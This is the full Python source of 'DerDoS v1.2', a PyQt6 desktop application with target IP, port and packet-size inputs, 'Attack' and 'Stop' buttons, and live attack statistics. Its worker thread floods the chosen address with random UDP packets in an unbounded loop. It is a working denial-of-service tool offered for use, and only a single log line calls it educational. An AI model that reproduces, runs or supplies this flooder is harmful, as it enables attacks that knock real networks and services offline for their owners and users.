from PyQt6 import QtCore, QtGui, QtWidgets
import socket
import os
import sys

class Ui_MainWindow(object):
    def setupUi(self, MainWindow):
        MainWindow.setObjectName("MainWindow")
        MainWindow.setEnabled(True)
        MainWindow.resize(700, 450)
        MainWindow.setMinimumSize(QtCore.QSize(800, 600))
        MainWindow.setMaximumSize(QtCore.QSize(1200, 1000))
        MainWindow.setWindowTitle("DerDoS")
        
        # Use native macOS style
        if sys.platform == "darwin":  # Check if running on macOS
            QtWidgets.QApplication.setStyle(QtWidgets.QStyleFactory.create("macOS"))
        
        # Setup window icon
        icon = QtGui.QIcon()
        icon.addPixmap(QtGui.QPixmap("derdos_builder/asset/windows-logo.ico"), QtGui.QIcon.Mode.Normal, QtGui.QIcon.State.Off)
        MainWindow.setWindowIcon(icon)
        
        # Main central widget
        self.centralwidget = QtWidgets.QWidget(MainWindow)
        self.centralwidget.setObjectName("centralwidget")
        
        # Main layout
        self.main_layout = QtWidgets.QVBoxLayout(self.centralwidget)
        self.main_layout.setContentsMargins(20, 20, 20, 20)
        self.main_layout.setSpacing(15)
        
        # Content section with input form and output log
        self.content_layout = QtWidgets.QHBoxLayout()
        
        # Left panel - Controls
        self.control_panel = QtWidgets.QWidget()
        self.control_layout = QtWidgets.QVBoxLayout(self.control_panel)
        self.control_layout.setContentsMargins(0, 0, 0, 0)
        self.control_layout.setSpacing(15)
        
        # IP Address input
        self.ip_group = QtWidgets.QGroupBox("Target IP Address")
        self.ip_layout = QtWidgets.QVBoxLayout(self.ip_group)
        self.ip = QtWidgets.QLineEdit()
        self.ip.setPlaceholderText("Enter IPv4 Address")
        self.ip.setObjectName("ip")
        self.ip_layout.addWidget(self.ip)
        self.control_layout.addWidget(self.ip_group)
        
        # Port input
        self.port_group = QtWidgets.QGroupBox("Target Port")
        self.port_layout = QtWidgets.QVBoxLayout(self.port_group)
        self.port = QtWidgets.QLineEdit()
        self.port.setPlaceholderText("Enter Port Number")
        self.port.setObjectName("port")
        self.port_layout.addWidget(self.port)
        self.control_layout.addWidget(self.port_group)
        
        # Packet size control
        self.packet_group = QtWidgets.QGroupBox("Packet Size (bytes)")
        self.packet_layout = QtWidgets.QVBoxLayout(self.packet_group)
        self.packet_size = QtWidgets.QSlider(QtCore.Qt.Orientation.Horizontal)
        self.packet_size.setMinimum(1024)
        self.packet_size.setMaximum(65500)
        self.packet_size.setValue(9216)
        self.packet_size.setTickPosition(QtWidgets.QSlider.TickPosition.TicksBelow)
        self.packet_size.setTickInterval(8192)
        self.packet_size_label = QtWidgets.QLabel(f"Size: {self.packet_size.value()}")
        self.packet_size.valueChanged.connect(lambda v: self.packet_size_label.setText(f"Size: {v}"))
        self.packet_layout.addWidget(self.packet_size)
        self.packet_layout.addWidget(self.packet_size_label)
        self.control_layout.addWidget(self.packet_group)
        
        # Stats display
        self.stats_group = QtWidgets.QGroupBox("Attack Statistics")
        self.stats_layout = QtWidgets.QFormLayout(self.stats_group)
        self.packets_sent_label = QtWidgets.QLabel("Packets Sent: 0")
        self.data_sent_label = QtWidgets.QLabel("Data Sent: 0 MB")
        self.stats_layout.addRow(self.packets_sent_label)
        self.stats_layout.addRow(self.data_sent_label)
        self.control_layout.addWidget(self.stats_group)
        
        # Buttons
        self.buttons_layout = QtWidgets.QHBoxLayout()
        self.attack = QtWidgets.QPushButton("Attack")
        self.attack.setObjectName("attack")
        self.attack.setMinimumHeight(70)
        self.attack.setCursor(QtGui.QCursor(QtCore.Qt.CursorShape.PointingHandCursor))
        self.stop = QtWidgets.QPushButton("Stop")
        self.stop.setObjectName("stop")
        self.stop.setMinimumHeight(70)
        self.stop.setEnabled(False)
        self.stop.setCursor(QtGui.QCursor(QtCore.Qt.CursorShape.PointingHandCursor))
        self.buttons_layout.addWidget(self.attack)
        self.buttons_layout.addWidget(self.stop)
        self.control_layout.addLayout(self.buttons_layout)
        
        # Credits label below buttons
        self.label = QtWidgets.QLabel()
        self.label.setOpenExternalLinks(True)
        self.label.setObjectName("label")
        self.label.setAlignment(QtCore.Qt.AlignmentFlag.AlignCenter)
        self.control_layout.addWidget(self.label)
        
        # Push spacer to bottom align controls
        self.control_layout.addStretch()
        
        # Right panel - Log output
        self.output_panel = QtWidgets.QWidget()
        self.output_layout = QtWidgets.QVBoxLayout(self.output_panel)
        self.output_layout.setContentsMargins(0, 0, 0, 0)
        
        # Log view
        self.log_label = QtWidgets.QLabel("Attack Log")
        self.output_layout.addWidget(self.log_label)
        
        self.plainTextEdit = QtWidgets.QPlainTextEdit()
        self.plainTextEdit.setReadOnly(True)
        self.plainTextEdit.setObjectName("plainTextEdit")
        self.output_layout.addWidget(self.plainTextEdit)
        
        # Progress bar only (credits moved)
        self.progress_layout = QtWidgets.QVBoxLayout()
        self.progressBar = QtWidgets.QProgressBar()
        self.progressBar.setProperty("value", 0)
        self.progressBar.setTextVisible(True)
        self.progressBar.setObjectName("progressBar")
        self.progress_layout.addWidget(self.progressBar)
        self.output_layout.addLayout(self.progress_layout)
        
        # Add panels to main content layout with a 1:2 ratio
        self.content_layout.addWidget(self.control_panel, 1)
        self.content_layout.addWidget(self.output_panel, 2)
        
        # Add content layout to main layout
        self.main_layout.addLayout(self.content_layout)
        
        # Set central widget
        MainWindow.setCentralWidget(self.centralwidget)
        
        # Status bar
        self.statusbar = QtWidgets.QStatusBar(MainWindow)
        self.statusbar.setObjectName("statusbar")
        MainWindow.setStatusBar(self.statusbar)
        
        # Initialize app
        self.retranslateUi(MainWindow)
        QtCore.QMetaObject.connectSlotsByName(MainWindow)
        
        # Connect signals
        self.attack.clicked.connect(self.shoot)
        self.stop.clicked.connect(self.stop_attack)
        
        # Initialize variables
        self.packets_sent = 0
        self.data_sent = 0
        
        # Welcome message
        self.plainTextEdit.appendPlainText("Welcome to DerDoS v1.2\n")
        self.plainTextEdit.appendPlainText("Enter target IP address and port to begin.\n")
        self.plainTextEdit.appendPlainText("WARNING: This tool should only be used for educational purposes and network testing. Unauthorized use against networks without permission is illegal.\n")

    def retranslateUi(self, MainWindow):
        _translate = QtCore.QCoreApplication.translate
        self.attack.setText(_translate("MainWindow", "Attack"))
        self.stop.setText(_translate("MainWindow", "Stop"))
        
        # Use system default link color for macOS
        self.label.setText(_translate("MainWindow", '<a href="https://github.com/ATOMIC09/DerDoS" style="text-decoration: none;">DerDoS v1.2 | Licensed under GPLv3</a>'))

    def shoot(self):
        """Prepare and start the attack"""
        if self.ip.text() == "" or self.port.text() == "":
            self.plainTextEdit.appendPlainText("Error: Please enter both IP Address and Port number\n")
            return
        
        try:
            # Validate port number
            port_num = int(self.port.text())
            if port_num < 1 or port_num > 65535:
                self.plainTextEdit.appendPlainText("Error: Port must be between 1 and 65535\n")
                return
                
            # Validate IP address format
            socket.inet_aton(self.ip.text())
            
            # Disable inputs
            self.ip.setReadOnly(True)
            self.port.setReadOnly(True)
            self.packet_size.setEnabled(False)
            self.attack.setEnabled(False)
            
            # Get target info
            target_ip = str(self.ip.text())
            target_port = port_num
            packet_size = self.packet_size.value()
            
            # Store target info
            self.target_ip_global = target_ip
            self.target_port_global = target_port
            self.packet_size_global = packet_size
            
            # Reset stats
            self.packets_sent = 0
            self.data_sent = 0
            self.update_stats()
            
            # Update UI
            self.plainTextEdit.clear()
            self.plainTextEdit.appendPlainText(f"Attack Details:\n- Target: {target_ip}:{target_port}\n- Packet Size: {packet_size} bytes\n")
            self.plainTextEdit.appendPlainText("Preparing attack sequence...\n")
            
            # Start progress animation
            self.animate_progress()
            
        except ValueError:
            self.plainTextEdit.appendPlainText("Error: Port must be a number\n")
        except socket.error:
            self.plainTextEdit.appendPlainText("Error: Invalid IP address format\n")

    def animate_progress(self):
        """Animate the progress bar before attack starts"""
        self.progress_thread = ProgressThread(self)
        self.progress_thread.progress_updated.connect(self.update_progress)
        self.progress_thread.finished.connect(self.start_attack)
        self.progress_thread.start()

    def update_progress(self, value):
        """Update progress bar value"""
        self.progressBar.setValue(value)

    def start_attack(self):
        """Start the actual attack after animation"""
        self.plainTextEdit.appendPlainText("Attack started!\n")
        self.plainTextEdit.appendPlainText("Sending packets...\n")
        
        # Enable stop button
        self.stop.setEnabled(True)
        
        # Start attack thread
        self.worker = WorkerThread(self)
        self.worker.start()
        
        # Start stats update timer
        self.stats_timer = QtCore.QTimer()
        self.stats_timer.timeout.connect(self.update_stats)
        self.stats_timer.start(1000)  # Update every second

    def update_stats(self):
        """Update attack statistics display"""
        if hasattr(self, 'packets_sent'):
            self.packets_sent_label.setText(f"Packets Sent: {self.packets_sent:,}")
            self.data_sent_label.setText(f"Data Sent: {self.data_sent / (1024*1024):.2f} MB")

    def stop_attack(self):
        """Stop the attack and reset UI"""
        if hasattr(self, 'worker'):
            self.worker.stop()
            
            if hasattr(self, 'stats_timer'):
                self.stats_timer.stop()
            
            self.progressBar.setProperty("value", 0)
            self.plainTextEdit.appendPlainText("\nAttack stopped.\n")
            self.plainTextEdit.appendPlainText("Ready for new target.\n")
            
            # Re-enable inputs
            self.ip.setReadOnly(False)
            self.port.setReadOnly(False)
            self.packet_size.setEnabled(True)
            self.attack.setEnabled(True)
            self.stop.setEnabled(False)

class ProgressThread(QtCore.QThread):
    """Thread for animating progress bar"""
    progress_updated = QtCore.pyqtSignal(int)
    
    def __init__(self, ui_reference):
        super().__init__()
        self.ui_reference = ui_reference
    
    def run(self):
        for i in range(101):
            self.progress_updated.emit(i)
            QtCore.QThread.msleep(20)

class WorkerThread(QtCore.QThread):
    """Thread for sending attack packets"""
    def __init__(self, ui_reference):
        super().__init__()
        self.ui_reference = ui_reference
        self.running = True
        self.packets_sent = 0
        self.bytes_sent = 0

    def run(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            data = os.urandom(self.ui_reference.packet_size_global)
            
            while self.running:
                try:
                    sent = s.sendto(data, (self.ui_reference.target_ip_global, self.ui_reference.target_port_global))
                    self.packets_sent += 1
                    self.bytes_sent += sent
                    
                    # Update UI stats (thread-safe via attributes)
                    self.ui_reference.packets_sent = self.packets_sent
                    self.ui_reference.data_sent = self.bytes_sent
                    
                except Exception:
                    # Skip failed packets
                    pass
                    
        except Exception as e:
            # Print to plainTextEdit (using signals would be better but this is simpler)
            self.ui_reference.plainTextEdit.appendPlainText(f"Error: {e}\n")

    def stop(self):
        self.running = False

if __name__ == "__main__":
    app = QtWidgets.QApplication(sys.argv)
    MainWindow = QtWidgets.QMainWindow()
    ui = Ui_MainWindow()
    ui.setupUi(MainWindow)
    MainWindow.show()
    sys.exit(app.exec())